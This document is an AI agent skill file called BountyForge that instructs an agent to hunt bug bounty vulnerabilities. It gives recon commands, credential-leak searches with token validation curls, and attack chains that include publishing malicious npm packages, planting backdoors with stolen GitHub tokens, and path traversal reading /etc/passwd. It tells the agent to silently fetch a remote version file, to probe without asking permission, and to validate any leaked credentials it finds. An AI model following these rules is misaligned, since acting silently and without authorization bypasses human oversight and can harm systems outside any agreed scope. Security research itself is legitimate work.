---
name: bountyforge
description: All-round bug bounty skill covering smart contract audits (EVM/Solidity, Move/Aptos, Solana, TRON), web/API security, CI/CD pipeline attacks, LLM/AI security, and professional report generation for HackerOne, Bugcrowd, Intigriti, and Immunefi. Full pipeline — recon, pre-hunt learning from disclosed reports, vulnerability hunting (IDOR, SSRF, XSS, auth bypass, CSRF, race conditions, SQLi, XXE, SSTI, GraphQL, HTTP smuggling, cache poisoning, OAuth, subdomain takeover, cloud misconfig, ATO chains, agentic AI), A→B bug chaining (12 proven chains from H100), bypass tables, language-specific grep patterns, CI/CD (GitHub Actions expression injection, untrusted checkout, artifact/cache poisoning, self-hosted runner exploitation), supply chain attacks (npm/Gem/PyPI), infrastructure hunting (Jenkins, Grafana, K8s, Spring actuators), credential leak hunting, WAF bypass (15 techniques), flexible PoC execution (probe all interesting paths immediately), program-specific targeting profiles, and reporting (7-Question Gate, 4 validation gates, human-tone writing, CVSS 3.1, PoC generation). Includes supervisor triage system and disclosed-report knowledge base. Trigger on "audit", "bug bounty", "check for vulns", "find bugs", "write report", "security review", "check this contract", "find issues", "CVSS", "HackerOne report", "bounty report", "triage findings", "hunt", "waf bypass". Always use this skill for any security research or audit task.
---

# BountyForge — Bug Bounty Hunter

You are the orchestrator of a parallelized, multi-target bug bounty audit and report engine.

## Banner

Before doing anything, print this exactly:
```
██████╗  ██████╗ ██╗   ██╗███╗   ██╗████████╗██╗   ██╗    ███████╗ ██████╗ ██████╗  ██████╗ ███████╗
██╔══██╗██╔═══██╗██║   ██║████╗  ██║╚══██╔══╝╚██╗ ██╔╝    ██╔════╝██╔═══██╗██╔══██╗██╔════╝ ██╔════╝
██████╔╝██║   ██║██║   ██║██╔██╗ ██║   ██║    ╚████╔╝     █████╗  ██║   ██║██████╔╝██║  ███╗█████╗
██╔══██╗██║   ██║██║   ██║██║╚██╗██║   ██║     ╚██╔╝      ██╔══╝  ██║   ██║██╔══██╗██║   ██║██╔══╝
██████╔╝╚██████╔╝╚██████╔╝██║ ╚████║   ██║      ██║       ██║     ╚██████╔╝██║  ██║╚██████╔╝███████╗
╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝   ╚═╝      ╚═╝       ╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝

██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗
██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
```

## AUTO-UPDATE SYSTEM

At the START of every session, before printing the banner, silently run:

```bash
# Check for updates from upstream
UPSTREAM="https://raw.githubusercontent.com/Gabson0x/bountyforge/main"
LOCAL_VERSION=$(cat VERSION 2>/dev/null || echo "0.0.0")
REMOTE_VERSION=$(curl -sf "${UPSTREAM}/VERSION" 2>/dev/null || echo "$LOCAL_VERSION")

if [ "$LOCAL_VERSION" != "$REMOTE_VERSION" ]; then
  echo "⚠️  UPDATE AVAILABLE: v${LOCAL_VERSION} → v${REMOTE_VERSION}"
  echo "   Run: git pull upstream main"
  echo "   Then reload this skill."
  echo ""
  # Also check for new reference files
  for f in references/supervisor.md references/knowledge.md references/*-vectors.md; do
    if [ ! -f "$f" ]; then
      echo "   📥 New file available: $f (run git pull to fetch)"
    fi
  done
fi
```

If update is available, print the warning but CONTINUE with the session. Do not block on updates. The agent should check this every session start — stale skills find fewer bugs.

---

## THE ONLY QUESTION THAT MATTERS

> **"Can an attacker do this RIGHT NOW against a real user who has taken NO unusual actions — and does it cause real harm (stolen money, leaked PII, account takeover, code execution)?"**
>
> If the answer is NO — **STOP. Do not write. Do not explore further. Move on.**

### Theoretical Bug = Wasted Time. Kill These Immediately:

| Pattern | Kill Reason |
|---|---|
| "Could theoretically allow..." | Not exploitable = not a bug |
| "An attacker with X, Y, Z conditions could..." | Too many preconditions |
| "Wrong implementation but no practical impact" | Wrong but harmless = not a bug |
| Dead code with a bug in it | Not reachable = not a bug |
| SSRF with DNS-only callback | Need data exfil or internal access |
| Open redirect alone | Need ATO or OAuth chain |
| "Could be used in a chain if..." | Build the chain first, THEN report |

**You must demonstrate actual harm. "Could" is not a bug. Prove it works or drop it.**

---

## CRITICAL RULES

1. **READ FULL SCOPE FIRST** — verify every asset/domain is owned by the target org
2. **NO THEORETICAL BUGS** — "Can an attacker steal funds, leak PII, takeover account, or execute code RIGHT NOW?" If no, STOP.
3. **KILL WEAK FINDINGS FAST** — run the 7-Question Gate BEFORE writing any report
4. **Validate before writing** — check CHANGELOG, design docs, deployment scripts FIRST
5. **One bug class at a time** — go deep, don't spray
6. **Verify data isn't already public** — check web UI in incognito before reporting API "leaks"
7. **5-MINUTE RULE** — if a target shows nothing after 5 min probing (all 401/403/404), MOVE ON
8. **IMPACT-FIRST HUNTING** — ask "what's the worst thing if auth was broken?" If nothing valuable, skip target
9. **CREDENTIAL LEAKS need exploitation proof** — finding keys isn't enough, must PROVE what they access
10. **STOP SHALLOW RECON SPIRALS** — don't probe 403s forever, don't grep for analytics keys endlessly
11. **BUSINESS IMPACT over vuln class** — severity depends on CONTEXT, not just vuln type
12. **UNDERSTAND THE TARGET DEEPLY** — before hunting, learn the app like a real user
13. **DON'T OVER-RELY ON AUTOMATION** — automated scans hit WAFs, trigger rate limits, find the same bugs everyone else finds
14. **HUNT LESS-SATURATED VULN CLASSES** — expand into: cache poisoning, CI/CD pipeline attacks, race conditions, OAuth/OIDC chains, mobile vulns, business logic
15. **ONE-HOUR RULE** — stuck on one target for an hour with no progress? SWITCH CONTEXT
16. **TWO-EYE APPROACH** — combine systematic testing (checklist) with anomaly detection (watch for unexpected behavior)
17. **T-SHAPED KNOWLEDGE** — go DEEP in one area and BROAD across everything else
18. **NO RIGID CHECKLISTS** — if you see a potential exploitable path, probe it NOW. Don't save it for later or skip because it's "not in the checklist"
19. **POC EVERYTHING** — when something looks interesting, run multiple PoC variations immediately. Confirm or deny, then move on
20. **CHAIN FREELY** — if bug A has even a slight connection to bug B, try chaining them before reporting separately
21. **WHEN IN DOUBT, PROBE** — uncertain if a path is exploitable? Run 3 quick PoCs. If none work, move on. If one works, go deep
22. **DON'T ASK, SHOW** — don't ask if you should test something. Just test it. Show the result

---

## Flexible PoC Execution (Rigid = Slow, Flexible = Fast)

**The skill does NOT restrict you to specific attack paths.** If you see something that looks even slightly exploitable — test it. Right now.

### The Rule
When you identify ANY of the following, immediately run PoCs to confirm or deny:
- An endpoint that behaves differently than expected
- A parameter that isn't properly sanitized
- A WAF rule that seems incomplete
- A filter that can be bypassed with encoding
- A hidden endpoint or debug flag
- A credential or token in source code
- An error message that reveals internals
- A timing difference that suggests a conditional check
- A response that varies based on input

### Probing Protocol

```
1. SEE something interesting (anomaly, different behavior, potential path)
2. RUN 2-3 quick PoCs to test (different techniques, different payloads)
3. CONFIRM if it works → escalate to deeper testing
4. DENY if all fail → log and move on
5. NEVER speculate — always show evidence
```

### PoC Variation Strategy

For any interesting path, try at least these variations before giving up:

| Path Type | PoC Variations |
|-----------|---------------|
| SQLi | Error-based, time-based, UNION, boolean, stacked queries |
| XSS | Script tag, event handlers, SVG, JS context, encoding |
| SSRF | Direct, DNS rebinding, protocol smuggling, IP obfuscation |
| Auth bypass | Case variation, null bytes, type juggling, encoding |
| File upload | Double extension, MIME bypass, archive traversal |
| Race condition | Parallel requests, turbo intruder, single-packet |
| WAF block | Case, comments, encoding, chunking, protocol downgrade |

### What NOT to Do

- **Don't ask permission to probe** — just do it
- **Don't save interesting paths for later** — test now or it's forgotten
- **Don't skip a path because it's "not in the checklist"** — the checklist is a guide, not a wall
- **Don't assume the WAF blocks everything** — always try bypass techniques
- **Don't report without PoC** — if you can't prove it, it's not a bug

---

## Mode Selection

Infer mode from user input. Multiple modes can be combined.

| Mode | Trigger | Scope |
|------|---------|-------|
| `--solidity` | `.sol` files present or EVM mentioned | Solidity/EVM smart contracts |
| `--move` | `.move` files or Aptos/CCTP mentioned | Move/Aptos smart contracts |
| `--solana` | `.rs` + Anchor/Solana mentioned | Solana programs (Rust/Anchor) |
| `--web` | URL, endpoint, API, HTTP mentioned | Web/API attack surface |
| `--cicd` | `.github/workflows`, GitHub Actions mentioned | CI/CD pipeline security |
| `--report` | "write report", "generate report", findings list | Generate BB platform report only |
| `--triage` | Raw findings list or JSON dump | Deduplicate + gate-evaluate only |
| `--full` | "full audit", no specific mode | All applicable modes |

**Exclude from smart contract scans:** `interfaces/`, `lib/`, `mocks/`, `test/`, `*.t.sol`, `*Test*.sol`, `*Mock*.sol`

**Flags:**
- `--platform <h1|bugcrowd|intigriti|immunefi>` — format final report for specific platform (default: generic)
- `--file-output` — write report to `bug-bounty-report-[timestamp].md`
- `--cvss` — include full CVSS 3.1 breakdown per finding
- `--learn` — run knowledge.md pipeline: search disclosed reports before hunting

---

## Orchestration (Agent-Driven Audit Mode)

### Turn 1 — Discover

Print the banner. Then in one message, make these parallel tool calls:

a. **Bash `find`** — locate all in-scope source files matching the selected mode(s)
b. **Glob** for `**/references/attack-vectors/*.md` — extract `{resolved_path}` (two levels up from this SKILL.md)
c. **Read** `VERSION` and `references/supervisor.md` and `references/knowledge.md` from the same directory
d. **Bash** auto-update check (see AUTO-UPDATE SYSTEM above)
e. **Bash** `mktemp -d /tmp/bbh-XXXXXX` → store as `{bundle_dir}`
f. **If `--learn` flag:** run knowledge.md pipeline — search HackerOne Hacktivity for target program's disclosed reports

Print discovered file list and mode(s) selected. If knowledge.md found disclosed reports, print key patterns extracted.

### Turn 2 — Prepare

In one message, make parallel reads: `{resolved_path}/report-formatting.md`, `{resolved_path}/judging.md`, `{resolved_path}/setup.md`, `{resolved_path}/local-tooling.md`, `{resolved_path}/supervisor.md`, `{resolved_path}/knowledge.md`, and all applicable attack vector files.

Then build all bundles in a single Bash `cat` command:

1. **`{bundle_dir}/source.md`** — all in-scope source files, each with `### path` header and fenced code block.

2. **Agent bundles** = `source.md` + agent-specific files. Skip agent bundles whose domain doesn't apply.

### Turn 3 — Spawn Agents

In one message, spawn all applicable agents as parallel foreground Agent calls.

**Agent Selection:**

| Agent | Domain | When to Use |
|-------|--------|-------------|
| `recon-agent` | Infrastructure, subdomains, exposed services | Start of any external target |
| `web-api-agent` | Injection, auth, XSS, SSRF, smuggling | Any web/API target |
| `access-control-agent` | IDOR, privilege escalation, SSO bypass | Auth/authz testing |
| `business-logic-agent` | State machine, payments, account abuse | Workflow testing |
| `race-condition-agent` | TOCTOU, front-running, concurrency | Financial/time-sensitive ops |
| `waf-bypass-agent` | WAF detection + bypass techniques | When payloads are blocked by WAF/CDN |
| `temp-email-agent` | Disposable email, verification bypass | Multi-account testing, ATO chains |
| `browser-automation-agent` | Playwright, OAuth flows, session extraction | Auth flow automation |
| `graphql-agent` | Introspection, batching, missing auth | GraphQL APIs |
| `credential-leak-agent` | GitHub tokens, .env, build log secrets | Secret hunting |
| `supply-chain-agent` | npm/Gem/PyPI squatting, CI/CD poisoning | Dependency analysis |
| `http-smuggling-agent` | CL.TE/TE.CL desync, session hijack | Proxy/CDN targets |
| `cache-poisoning-agent` | Unkeyed headers, CSP bypass, cache deception | CDN-backed targets |
| `mobile-client-agent` | APK/IPA, Electron, game clients, deep links | Client-side apps |
| `crypto-math-agent` | Overflow, precision, signatures | Smart contract math |
| `economic-security-agent` | Flash loans, oracle manipulation | DeFi/protocol economics |

**Flexibility Rule:** If an agent encounters something interesting outside its domain, it should probe it immediately rather than ignore it. WAF bypass agent finds SQLi? Test it. Recon agent finds leaked creds? Validate them. Don't defer — confirm now.

### Turn 4 — Deduplicate, Validate & Output

Single-pass: deduplicate → gate-evaluate → report. Use supervisor.md triage rules.

---

## AUTH-AWARE HUNTING

Anonymous recon misses the bugs that pay most. IDOR, BOLA, mass-assignment, privilege escalation, auth bypass, SSRF behind login, and most LLM/agent bugs are invisible until you log in.

```bash
# Pick ONE:
python3 tools/hunt.py --target T --cookie 'session=eyJabc...'
python3 tools/hunt.py --target T --bearer 'eyJhbGciOi...'
python3 tools/hunt.py --target T --auth-file .private/T.json
```

**For IDOR / BOLA hunts**, load two sessions and diff behavior:

```bash
python3 tools/hunt.py --target T --auth-file .private/T-user-a.json
python3 tools/hunt.py --target T --auth-file .private/T-user-b.json
```

**Safety**: cookies/tokens never appear in logs, hunt-memory, or `repr()`. Only a 12-char `session_id` hash is recorded. `.private/` is gitignored.

---

## A→B BUG SIGNAL METHOD (Cluster Hunting)

**When you find bug A, systematically hunt for B and C nearby.** Single bugs pay. Chains pay 3-10x more.

### Known A→B→C Chains

| Bug A (Signal) | Hunt for Bug B | Escalate to C |
|----------------|---------------|---------------|
| IDOR (read) | PUT/DELETE on same endpoint | Full account data manipulation |
| SSRF (any) | Cloud metadata 169.254.169.254 | IAM credential exfil → RCE |
| XSS (stored) | Check HttpOnly on session cookie | Session hijack → ATO |
| Open redirect | OAuth redirect_uri accepts your domain | Auth code theft → ATO |
| S3 bucket listing | Enumerate JS bundles | Grep for OAuth client_secret → OAuth chain |
| Rate limit bypass | OTP brute force | Account takeover |
| GraphQL introspection | Missing field-level auth | Mass PII exfil |
| Debug endpoint | Leaked environment variables | Cloud credential → infrastructure access |
| CORS reflects origin | Test with credentials: include | Credentialed data theft |
| Host header injection | Password reset poisoning | ATO via reset link |

### Cluster Hunt Protocol

```
1. CONFIRM A     Verify bug A is real with an HTTP request
2. MAP SIBLINGS  Find all endpoints in the same controller/module/API group
3. TEST SIBLINGS Apply the same bug pattern to every sibling
4. CHAIN         If sibling has different bug class, try combining A + B
5. QUANTIFY      "Affects N users" / "exposes $X value" / "N records"
6. REPORT        One report per chain (not per bug). Chains pay more.
```

---

## H100 PROVEN A→B CHAINS (From HackerOne Top 100 Upvoted)

These are not theoretical. Every chain below was reported, triaged, and paid.

### Chain 1: HTTP Smuggling → Session Hijack → Mass ATO
**Source:** Slack #737140 ($0, 866uv), Zomato #771666, New Relic #498052 ($3K)
```
1. Find CL.TE desync on subdomain behind Akamai/Cloudflare
2. Craft smuggled request that forces victim into 301 redirect
3. Redirect points to Burp Collaborator / attacker server
4. Victim's browser follows redirect WITH session cookies attached
5. Steal d cookie / session token from Collaborator logs
6. Impersonate victim — full account access
```
**Key detail:** Target subdomains with "b" suffix (slackb.com) — often less hardened than main domain.

### Chain 2: Cache Poisoning → Stored XSS on Auth Pages
**Source:** PayPal #488147 ($18.9K) + #510152 ($20K, 2679uv)
```
1. Find unkeyed header (X-Forwarded-Host, X-Original-URL) reflected in response
2. Poison CDN cache with XSS payload in that header
3. Cached page served to ANY user visiting paypal.com/signin
4. CSP bypass via older jQuery library on paypalobjects.com
5. jQuery selector gadget converts <script> tag to executable code
6. Session tokens / credentials stolen from login page context
```
**Key detail:** Even with CSP, jQuery + 'unsafe-eval' = CSP bypass. Search for older JS libraries in scope domains.

### Chain 3: Email Confirmation Bypass → SSO Takeover → Full Store Compromise
**Source:** Shopify #791775 ($0, 1913uv) + #796808 ($0, 894uv) + #910300 ($0, 559uv)
```
1. Create trial account with your email
2. Change email to victim's email in profile
3. Confirmation link sent to YOUR email (not victim's)
4. Confirm victim's email on your account
5. Use Shopify SSO — now your account "owns" victim's email
6. Set master password via SSO for all stores using that email
7. Full takeover of victim's Shopify stores
```
**Key detail:** The fix was incomplete 3 times. Always re-test after patches.

### Chain 4: Leaked GitHub Token → Repo Access → Supply Chain
**Source:** Shopify #1087489 ($50K, 1544uv), Starbucks #716292, Snapchat #47
```
1. Download target's public app (Electron .asar, Android APK, iOS IPA)
2. Extract .env or config from packaged app
3. Find GitHub Personal Access Token
4. Test token: curl -H "Authorization: token TOKEN" https://api.github.com/user
5. If org member → read/write access to ALL private repos
6. Plant backdoor in source code → downstream users compromised
```
**Key detail:** Always check compiled/packaged apps, not just source repos.

### Chain 5: SSRF → Cloud Metadata → RCE
**Source:** Shopify #446585 ($11K), Snapchat #530974, Shopify #341876
```
1. Find SSRF (file import, image URL fetch, analytics reports)
2. Access AWS metadata: http://169.254.169.254/latest/meta-data/
3. Get IAM role credentials from metadata endpoint
4. Use credentials to access S3, internal APIs, or other cloud services
5. Pivot to RCE via CI/CD, Lambda, or internal admin panels
```

### Chain 6: npm/Supply Chain → RCE
**Source:** PayPal #925585 ($30K, 933uv), LY Corp #1043385 ($11.5K)
```
1. Enumerate target's npm dependencies (package.json, lock files)
2. Find internal package names (scoped @company/* or custom names)
3. Check if package exists on public npm registry
4. If not → publish malicious package with same name
5. Target's CI/CD installs package → arbitrary code execution
```
**Key detail:** Also works with Ruby gems, Python packages, Go modules.

### Chain 7: Git Flag Injection → File Overwrite → RCE
**Source:** GitLab #658013 ($12K, 777uv), #587854 ($12K, 542uv)
```
1. Craft malicious git repository with special filenames
2. Filename contains git flags: --template=/etc/cron.d/backdoor
3. Target imports the repository
4. Git processes the flag → overwrites system files
5. Write crontab, SSH keys, or web shell → RCE
```

### Chain 8: VPN/Infrastructure 1-Day → Pre-Auth RCE
**Source:** X/Twitter #591295 ($20.16K, 1239uv) — Orange Tsai
```
1. Monitor for CVE patches on VPN appliances (Pulse Secure, FortiGate)
2. Wait 30 days for targets to patch
3. Check if target still vulnerable: pulse_check.py target.com
4. CVE-2019-11510: pre-auth arbitrary file read → extract session DB
5. Bypass 2FA via "Roaming Session" feature (forge cookies)
6. SSRF to admin panel (WebVPN → proxy to itself)
7. Crack manager password hash (weak policy on admin accounts)
8. Command injection on admin interface → root RCE
```
**Key detail:** Monitor vendor advisories. Many orgs take 60-90 days to patch VPNs.

### Chain 9: Kubernetes API Exposed → Container RCE
**Source:** Snapchat #455645 ($25K, 1185uv)
```
1. Find exposed Kubernetes API server (often on non-standard port)
2. No authentication required
3. kubectl --server=https://target:6443 get pods
4. Execute into any running container
5. Full server access from within container
```

### Chain 10: GraphQL Missing Auth → Mass PII Exfil
**Source:** HackerOne #489146 ($0, 1032uv), #792927, #2032716 ($12.5K)
```
1. Run GraphQL introspection query
2. Find user-related types with sensitive fields (email, PII)
3. Query without authentication or with low-privilege token
4. Enumerate all users via pagination or node() queries
5. Extract full user database including private program reports
```

### Chain 11: Project Import → Private Data Exfil
**Source:** GitLab #827052 ($20K, 1500uv), #1132378 ($16K), #743953 ($20K)
```
1. Create issue with markdown image reference using path traversal
2. ![a](/uploads/aaaa...aaa/../../../../../../../../../../etc/passwd)
3. Move issue to another project
4. UploadsRewriter copies the file without path validation
5. Arbitrary file read: /etc/passwd, tokens, configs, database.yml
6. Escalate to RCE by reading SSH keys or database credentials
```

### Chain 12: SMTP/Email System → Credential Theft
**Source:** PayPal #739737 ($15.3K, 1408uv)
```
1. Trigger security challenge flow on PayPal
2. Intercept token in the challenge response
3. Token leaks victim's email AND plaintext password
4. Direct login with stolen credentials
```

---

## TOP 1% HACKER MINDSET

### Crown Jewel Thinking
Before touching anything, ask: "If I were the attacker and I could do ONE thing to this app, what causes the most damage?"

### Developer Empathy
Think like the developer who built the feature:
- What was the simplest implementation?
- What shortcut would a tired dev take at 2am?
- Where is auth checked — controller? middleware? DB layer?
- What happens when you call endpoint B without going through endpoint A first?

### Trust Boundary Mapping
```
Client → CDN → Load Balancer → App Server → Database
         ^               ^              ^
    Where does app STOP trusting input?
    Where does it ASSUME input is already validated?
```

### Key Mindset Rules
- **"Hunt the feature, not the endpoint"** — Find all endpoints that serve a feature, then test the INTERACTION between them
- **"Authorization inconsistency is your friend"** — If the app checks auth in 9 places but not the 10th, that's your bug
- **"New == unreviewed"** — Features launched in the last 30 days have lowest security maturity
- **"Follow the money"** — Any feature touching payments, billing, credits, refunds is where developers make security shortcuts
- **"The API the mobile app uses"** — Mobile apps often call older/different API versions with lower maturity
- **"Diffs find bugs"** — Compare old API docs vs new. Compare mobile API vs web API

---

# PHASE 1: RECON

## Standard Recon Pipeline
```bash
# Step 1: Subdomains
subfinder -d TARGET -silent | anew /tmp/subs.txt
assetfinder --subs-only TARGET | anew /tmp/subs.txt

# Step 2: Resolve + live hosts
cat /tmp/subs.txt | dnsx -silent | httpx -silent -status-code -title -tech-detect -o /tmp/live.txt

# Step 3: URL collection
cat /tmp/live.txt | awk '{print $1}' | katana -d 3 -silent | anew /tmp/urls.txt
echo TARGET | waybackurls | anew /tmp/urls.txt
gau TARGET | anew /tmp/urls.txt

# Step 4: Nuclei scan
nuclei -l /tmp/live.txt -severity critical,high,medium -silent -o /tmp/nuclei.txt

# Step 5: JS secrets
cat /tmp/urls.txt | grep "\.js$" | sort -u > /tmp/jsfiles.txt
# Run SecretFinder on each JS file
```

## Technology Fingerprinting

| Signal | Technology |
|---|---|
| Cookie: `XSRF-TOKEN` + `*_session` | Laravel |
| Cookie: `PHPSESSID` | PHP |
| Header: `X-Powered-By: Express` | Node.js/Express |
| Response: `wp-json`/`wp-content` | WordPress |
| Response: `{"errors":[{"message":` | GraphQL |
| Cookie: `ARRAffinity` | Azure App Service |
| Header: `cf-ray` | Cloudflare |
| Header: `x-akamai-*` | Akamai |

## Quick Wins Checklist
- [ ] Subdomain takeover (`subjack`, `subzy`)
- [ ] Exposed `.git` (`/.git/config`)
- [ ] Exposed env files (`/.env`, `/.env.local`)
- [ ] Default credentials on admin panels
- [ ] JS secrets (SecretFinder, jsluice)
- [ ] Open redirects (`?redirect=`, `?next=`, `?url=`)
- [ ] CORS misconfig (test `Origin: https://evil.com` + credentials)
- [ ] S3/cloud buckets
- [ ] GraphQL introspection enabled
- [ ] Spring actuators (`/actuator/env`, `/actuator/heapdump`)
- [ ] Firebase open read (`/.json`)
- [ ] Hardcoded API keys in JS bundles
- [ ] Credentials in public Git repos (GitHub, GitLab, Bitbucket)
- [ ] Exposed CI/CD dashboards (Jenkins, CircleCI, Travis CI)

## Credential Leak Hunting (H100 Pattern — 7 reports, $50K+ total)

5 of the Top 100 reports involved leaked credentials in code repos or build artifacts.

### Token Types That Pay

| Token Type | How to Find | Impact |
|------------|-------------|--------|
| GitHub Personal Access Token | `grep -r "ghp_\|github_pat_" --include="*.env" --include="*.json"` | Read/write all org repos |
| npm token | `grep -r "npm_" --include="*.npmrc" --include="*.env"` | Publish to org's npm scope |
| AWS Access Key | `grep -r "AKIA" --include="*.env" --include="*.py" --include="*.js"` | Full AWS access |
| Slack webhook | `grep -r "hooks.slack.com" --include="*.env" --include="*.yml"` | Post to any channel |
| Stripe key | `grep -r "sk_live_\|pk_live_" --include="*.env" --include="*.js"` | Payment processing |
| Docker Hub token | `grep -r "dckr_pat_" --include="*.env"` | Container registry access |
| Google API key | `grep -r "AIza" --include="*.env" --include="*.js"` | Various GCP services |

### Where to Find Leaked Tokens

**Public repos:**
```bash
# Search target's GitHub org for secrets
gh api -X GET "search/code?q=org:TARGET+filename:.env" --jq '.items[].repository.full_name'
gh api -X GET "search/code?q=org:TARGET+AKIA" --jq '.items[].html_url'

# Check for .env in compiled apps
asar extract app.asar /tmp/app
grep -r "TOKEN\|SECRET\|KEY\|PASSWORD" /tmp/app/
```

**Build logs:**
```bash
# Travis CI (Superhuman #496937 — $5K)
curl -s "https://api.travis-ci.org/repos/TARGET/REPO/builds" | jq '.[].config.raw_config'
# Look for: env.global with secrets, deploy section

# GitHub Actions logs
gh run list --repo TARGET/REPO --limit 5
gh run view RUN_ID --repo TARGET/REPO --log | grep -i "token\|secret\|key"
```

**Docker images:**
```bash
# Pull and inspect
docker pull TARGET/app:latest
docker run --rm -it TARGET/app:latest env
docker run --rm -it TARGET/app:latest cat /app/.env
```

### Token Validation PoC
```bash
# GitHub token
curl -H "Authorization: token ghp_xxxxx" https://api.github.com/user
# If 200 → valid, check repos_access, org membership

# AWS key
aws sts get-caller-identity --access-key-id AKIAxxxx --secret-access-key xxxx
# If valid → enumerate S3 buckets, IAM policies

# npm token
curl -H "Authorization: Bearer npm_xxxxx" https://registry.npmjs.org/-/whoami
# If valid → check publish access to org packages
```

## Source Code Recon
```bash
# Security surface
git log --oneline --all --grep="security\|CVE\|fix\|vuln" | head -20
grep -rn "TODO\|FIXME\|HACK\|UNSAFE" --include="*.ts" --include="*.js" | grep -iv "test"

# Dangerous patterns (JS/TS)
grep -rn "eval(\|innerHTML\|dangerouslySetInner\|execSync" --include="*.ts" --include="*.js" | grep -v node_modules
grep -rn "__proto__\|constructor\[" --include="*.js" --include="*.ts" | grep -v node_modules

# Python
grep -rn "pickle\.loads\|yaml\.load\|eval(" --include="*.py" | grep -v test
grep -rn "subprocess\|os\.system\|os\.popen" --include="*.py" | grep -v test

# PHP
grep -rn "unserialize\|eval(\|preg_replace.*e" --include="*.php"
grep -rn "\$_GET\|\$_POST\|\$_REQUEST" --include="*.php" | grep "include\|require\|file_get"

# Go
grep -rn "template\.HTML\|template\.JS\|template\.URL" --include="*.go"

# Ruby
grep -rn "YAML\.load[^_]\|Marshal\.load" --include="*.rb"

# Rust (network-facing only)
grep -rn "\.unwrap()\|\.expect(" --include="*.rs" | grep -v "test\|encode\|to_bytes\|serialize"
grep -rn "unsafe {" --include="*.rs" -B5 | grep "read\|recv\|parse\|decode"
```

---

# PHASE 2: LEARN (Pre-Hunt Intelligence)

## Disclosed Report Pipeline (knowledge.md)

At hunt start, ALWAYS check for disclosed reports on the target program:

```bash
# HackerOne Hacktivity for program
curl -s "https://hackerone.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ hacktivity_items(first:25, order_by:{field:popular, direction:DESC}, where:{team:{handle:{_eq:\"PROGRAM\"}}}) { nodes { ... on HacktivityDocument { report { title severity_rating } } } } }"}' \
  | jq '.data.hacktivity_items.nodes[].report'
```

### "What Changed" Method (Highest ROI)
1. Find disclosed report for similar tech → Get the fix commit → Read the diff → Identify the anti-pattern → Grep your target for that same anti-pattern

### 6 Key Patterns from Top Reports
1. **Feature Complexity = Bug Surface** — imports, integrations, multi-tenancy, multi-step workflows
2. **Developer Inconsistency = Strongest Evidence** — `timingSafeEqual` in one place, `===` elsewhere
3. **"Else Branch" Bug** — proxy/gateway passes raw token without validation in else path
4. **Import/Export = SSRF** — every "import from URL" feature has historically had SSRF
5. **Secondary/Legacy Endpoints = No Auth** — `/api/v1/` guarded but `/api/` isn't
6. **Race Windows in Financial Ops** — check-then-deduct as two DB operations = double-spend

## Threat Model Template
```
TARGET: _______________
CROWN JEWELS: 1.___ 2.___ 3.___
ATTACK SURFACE:
  [ ] Unauthenticated: login, register, password reset, public APIs
  [ ] Authenticated: all user-facing endpoints, file uploads, API calls
  [ ] Cross-tenant: org/team/workspace ID parameters
  [ ] Admin: /admin, /internal, /debug
HIGHEST PRIORITY (crown jewel x easiest entry):
  1.___ 2.___ 3.___
```

---

# PHASE 3: HUNT

## Note-Taking System (Never Hunt Without This)
```markdown
# TARGET: company.com -- SESSION 1

## Interesting Leads (not confirmed bugs yet)
- [14:22] /api/v2/invoices/{id} -- no auth check visible in source, testing...

## Dead Ends (don't revisit)
- /admin -> IP restricted, confirmed by trying 15+ bypass headers

## Anomalies
- GET /api/export returns 200 even when session cookie is missing
- Response time: POST /api/check-user -> 150ms (exists) vs 8ms (doesn't)

## Confirmed Bugs
- [15:10] IDOR on /api/invoices/{id} -- read+write
```

## Subdomain Type → Hunt Strategy
- **dev/staging/test**: Debug endpoints, disabled auth, verbose errors
- **admin/internal**: Default creds, IP bypass headers (`X-Forwarded-For: 127.0.0.1`)
- **api/api-v2**: Enumerate with kiterunner, check older unprotected versions
- **auth/sso**: OAuth misconfigs, open redirect in `redirect_uri`
- **upload/cdn**: CORS, path traversal, stored XSS

---

# VULNERABILITY HUNTING CHECKLISTS

## IDOR — #1 Most Paid Web2 Class

| Variant | What to Test |
|---------|-------------|
| V1: Direct | Change object ID in URL path `/api/users/123` → `/api/users/456` |
| V2: Body param | Change ID in POST/PUT JSON body `{"user_id": 456}` |
| V3: GraphQL node | `{ node(id: "base64(OtherType:123)") { ... } }` |
| V4: Batch/bulk | `/api/users?ids=1,2,3,4,5` — request multiple IDs at once |
| V5: Nested | Change parent ID: `/orgs/{org_id}/users/{user_id}` |
| V6: File path | `/files/download?path=../other-user/file.pdf` |
| V7: Predictable | Sequential integers, timestamps, short UUIDs |
| V8: Method swap | GET returns 403? Try PUT/PATCH/DELETE on same endpoint |
| V9: Version rollback | v2 blocked? Try `/api/v1/` same endpoint |
| V10: Header injection | `X-User-ID: victim_id`, `X-Org-ID: victim_org` |

### IDOR Testing Checklist
- [ ] Create two accounts (A = attacker, B = victim)
- [ ] Log in as A, perform all actions, note all IDs in requests
- [ ] Log in as B, replay A's requests with A's IDs using B's auth
- [ ] Try EVERY endpoint with swapped IDs — not just GET, also PUT/DELETE/PATCH
- [ ] Check API v1/v2 differences
- [ ] Check GraphQL schema for node() queries
- [ ] Check WebSocket messages for client-supplied IDs
- [ ] Test batch endpoints (can you request multiple IDs?)

### Creating Test Accounts (Disposable Email & Phone)

IDOR needs two accounts. Most programs require email verification; some require SMS. Don't use your real accounts — you need burner identities you fully control.

**Disposable Email (for email verification):**
| Service | Notes |
|---------|-------|
| [Guerrilla Mail](https://guerrillamail.com) | Inbox lasts 1 hour, custom addresses, API available |
| [Mailinator](https://mailinator.com) | Public inboxes, no signup, any @mailinator.com address works |
| [Temp-Mail](https://temp-mail.org) | Disposable inbox, mobile app available |
| [10MinuteMail](https://10minutemail.com) | Self-destructs after 10 min, extendable |
| [YOPmail](https://yopmail.com) | No registration, any @yopmail.com address, check any inbox |
| [Emailnator](https://emailnator.com) | Gmail-style inbox, longer-lived |

```bash
# Guerrilla Mail API — get inbox and fetch emails programmatically
